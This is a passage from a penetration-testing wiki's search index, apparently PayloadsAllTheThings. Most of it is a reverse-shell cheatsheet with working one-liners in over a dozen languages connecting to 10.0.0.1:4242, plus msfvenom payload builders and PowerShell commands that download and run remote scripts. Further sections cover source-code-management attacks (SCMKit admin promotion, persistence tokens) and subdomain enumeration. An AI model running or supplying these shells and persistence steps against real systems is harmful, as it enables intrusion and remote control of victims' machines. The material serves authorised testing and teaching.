'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv6 <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre></p> <p>Windows only (Python2)</p> <pre><code>python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n</code></pre> <p>Windows only (Python3)</p> <pre><code>python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\", \"r\");'\n</code></pre> <pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\nruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\nNOTE: Windows only\nruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#golang","title":"Golang","text":"<pre><code>echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -e /bin/sh 10.0.0.1 4242\nnc -e /bin/bash 10.0.0.1 4242\nnc -c bash 10.0.0.1 4242\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-busybox","title":"Netcat BusyBox","text":"<pre><code>rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#ncat","title":"Ncat","text":"<pre><code>ncat 10.0.0.1 4242 -e /bin/bash\nncat --udp 10.0.0.1 4242 -e /bin/bash\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#openssl","title":"OpenSSL","text":"<p>Attacker: <pre><code>user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nuser@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242\nor\nuser@attack$ ncat --ssl -vv -l -p 4242\nuser@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/s\n</code></pre></p> <p>TLS-PSK (does not rely on PKI or self-signed certificates) <pre><code># generate 384-bit PSK\n# use the generated string as a value for the two PSK variables from below\nopenssl rand -hex 48 # server (attacker)\nexport LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT\n# client (victim)\nexport RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#powershell","title":"Powershell","text":"<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#awk","title":"Awk","text":"<pre><code>awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell&gt;\" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java","title":"Java","text":"<pre><code>Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done'\");\np.waitFor();\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java-alternative-1","title":"Java Alternative 1","text":"<pre><code>String host=\"127.0.0.1\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java-alternative-2","title":"Java Alternative 2","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread thread = new Thread(){\npublic void run(){\n// Reverse shell here\n}\n}\nthread.start();\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#telnet","title":"Telnet","text":"<pre><code>In Attacker machine start two listeners:\nnc -lvp 8080\nnc -lvp 8081\nIn Victime machine run below command:\ntelnet &lt;Your_IP&gt; 8080 | /bin/sh | telnet &lt;Your_IP&gt; 8081\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#war","title":"War","text":"<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#lua","title":"Lua","text":"<p>Linux only</p> <pre><code>lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"\n</code></pre> <p>Windows and Linux</p> <pre><code>lua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#nodejs","title":"NodeJS","text":"<pre><code>(function(){\nvar net = require(\"net\"),\ncp = require(\"child_process\"),\nsh = cp.spawn(\"/bin/sh\", []);\nvar client = new net.Socket();\nclient.connect(4242, \"10.0.0.1\", function(){\nclient.pipe(sh.stdin);\nsh.stdout.pipe(client);\nsh.stderr.pipe(client);\n});\nreturn /a/; // Prevents the Node.js application from crashing\n})();\nor\nrequire('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')\nor\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')\nor\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#groovy","title":"Groovy","text":"<p>by frohoff NOTE: Java reverse shell also work for Groovy</p> <pre><code>String host=\"10.0.0.1\";\nint port=4242;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#groovy-alternative-1","title":"Groovy Alternative 1","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread.start {\n// Reverse shell here\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#c","title":"C","text":"<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\nint main(void){\nint port = 4242;\nstruct sockaddr_in revsockaddr;\nint sockt = socket(AF_INET, SOCK_STREAM, 0);\nrevsockaddr.sin_family = AF_INET;       revsockaddr.sin_port = htons(port);\nrevsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\");\nconnect(sockt, (struct sockaddr *) &amp;revsockaddr, sizeof(revsockaddr));\ndup2(sockt, 0);\ndup2(sockt, 1);\ndup2(sockt, 2);\nchar * const argv[] = {\"/bin/sh\", NULL};\nexecve(\"/bin/sh\", argv, NULL);\nreturn 0;       }\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#dart","title":"Dart","text":"<pre><code>import 'dart:io';\nimport 'dart:convert';\nmain() {\nSocket.connect(\"10.0.0.1\", 4242).then((socket) {\nsocket.listen((data) {\nProcess.start('powershell.exe', []).then((Process process) {\nprocess.stdin.writeln(new String.fromCharCodes(data).trim());\nprocess.stdout\n.transform(utf8.decoder)\n.listen((output) { socket.write(output); });\n});\n},\nonDone: () {\nsocket.destroy();\n});\n});\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#meterpreter-shell","title":"Meterpreter Shell","text":""},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#windows-staged-reverse-tcp","title":"Windows Staged reverse TCP","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#windows-stageless-reverse-tcp","title":"Windows Stageless reverse TCP","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#linux-staged-reverse-tcp","title":"Linux Staged reverse TCP","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#linux-stageless-reverse-tcp","title":"Linux Stageless reverse TCP","text":"<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#other-platforms","title":"Other platforms","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.pl\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#spawn-tty-shell","title":"Spawn TTY Shell","text":"<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p> <pre><code>rlwrap nc 10.0.0.1 4242\nrlwrap -r -f . nc 10.0.0.1 4242\n-f . will make rlwrap use the current history file as a completion word list.\n-r Put all words seen on in- and output on the completion list.\n</code></pre> <p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p> <p> OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p> <p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p> <pre><code>ctrl+z\necho $TERM &amp;&amp; tput lines &amp;&amp; tput cols\n# for bash\nstty raw -echo\nfg\n# for zsh\nstty raw -echo; fg\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows &lt;num&gt; columns &lt;cols&gt;\n</code></pre> <p>or use <code>socat</code> binary to get a fully tty reverse shell</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:12345\n</code></pre> <p>Spawn a TTY shell from an interpreter</p> <pre><code>/bin/sh -i\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n</code></pre> <ul> <li>vi: <code>:!bash</code></li> <li>vi: <code>:set shell=/bin/bash:shell</code></li> <li>nmap: <code>!sh</code></li> <li>mysql: <code>! bash</code></li> </ul> <p>Alternative TTY method</p> <pre><code>www-data@debian:/dev/shm$ su - user\nsu: must be run from a terminal\n\nwww-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null\nwww-data@debian:/dev/shm$ su - user\nPassword: P4ssW0rD\n\nuser@debian:~$ \n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#fully-interactive-reverse-shell-on-windows","title":"Fully interactive reverse shell on Windows","text":"<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p> <p>ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</p> <p>Server Side:</p> <pre><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001\n</code></pre> <p>Client Side:</p> <pre><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001\n</code></pre> <p>Offline version of the ps1 available at --&gt; https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</p>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#references","title":"References","text":"<ul> <li>Reverse Bash Shell One Liner</li> <li>Pentest Monkey - Cheat Sheet Reverse shell</li> <li>Spawning a TTY Shell</li> <li>Obtaining a fully interactive shell</li> </ul>"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/","title":"Source Code Management","text":""},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#summary","title":"Summary","text":"<ul> <li>Enumeration</li> <li>Exploit Gitlab CI/Github Actions</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#enumeration","title":"Enumeration","text":"<p>Using SCMKit - Source Code Management Attack Toolkit</p> <ul> <li>Discover repositories being used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local\n</code></pre></li> <li>Search for repositories by repository name in a particular SCM system     <pre><code>SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o \"some search term\"\nSCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o \"some search term\"\n</code></pre></li> <li>Search for code containing a given keyword in a particular SCM system     <pre><code>SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o \"some search term\"\nSCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o \"some search term\"\n</code></pre></li> <li>Search for files in repositories containing a given keyword in the file name in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o \"some search term\"\nSCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o \"some search term\"\n</code></pre></li> <li>List snippets owned by the current user in GitLab     <pre><code>SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local\n</code></pre></li> <li>List all GitLab runners available to the current user in GitLab     <pre><code>SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local\n</code></pre></li> <li>Get the assigned privileges to an access token being used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local\n</code></pre></li> <li>Promote a normal user to an administrative role in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName\n</code></pre></li> <li>Create/List/Delete an access token to be used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID\nSCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser\nSCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser\n</code></pre></li> <li>Create/List an SSH key to be used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o \"ssh public key\"\nSCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \"ssh public key\"\nSCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local\nSCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local\nSCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID\nSCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#personal-access-token","title":"Personal Access Token","text":"<p>Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.</p> <pre><code>curl -k --request POST --header \"PRIVATE-TOKEN: apiToken\" --data \"name=user-persistence-token\" --data \"expires_at=\" --data \"scopes[]=api\" --data \"scopes[]=read_repository\" --data \"scopes[]=write_repository\" \"https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#exploit-gitlab-cigithub-actions","title":"Exploit Gitlab CI/Github Actions","text":"<ul> <li>Gitlab-CI \"Command Execution\" example: <code>.gitlab-ci.yml</code> <pre><code>stages:\n- test\ntest:\nstage: test\nscript:\n- |\nwhoami\nparallel:\nmatrix:\n- RUNNER: VM1\n- RUNNER: VM2\n- RUNNER: VM3\ntags:\n- ${RUNNER}\n</code></pre></li> <li>Github Action \"Command Execution\" example: <code>.github/workflows/example.yml</code> <pre><code>name: example\non:\n  workflow_dispatch:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: windows-2019\n\n    steps:\n      - name: Execute\n        run: |\n          whoami\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#references","title":"References","text":"<ul> <li>Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022</li> </ul>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/","title":"Subdomains Enumeration","text":""},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#summary","title":"Summary","text":"<ul> <li>Enumerate all subdomains</li> <li>Subbrute</li> <li>KnockPy</li> <li>GoogleDorks</li> <li>EyeWitness</li> <li>Sublist3r</li> <li>Subfinder</li> <li>Findomain</li> <li>Aquatone (Ruby and Go versions)</li> <li>AltDNS</li> <li>MassDNS</li> <li>Nmap</li> <li>Dnsdumpster</li> <li>Subdomain take over</li> <li>tko-subs</li> <li>HostileSubBruteForcer</li> <li>SubOver</li> </ul>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#enumerate-all-subdomains-only-if-the-scope-is-domainext","title":"Enumerate all subdomains (only if the scope is *.domain.ext)","text":""},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subbrute","title":"Using Subbrute","text":"<pre><code>git clone https://github.com/TheRook/subbrute\npython subbrute.py domain.example.com\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-knockpy-with-daniel-miesslers-seclists-for-subdomain-discoverdns","title":"Using KnockPy with Daniel Miessler\u2019s SecLists for 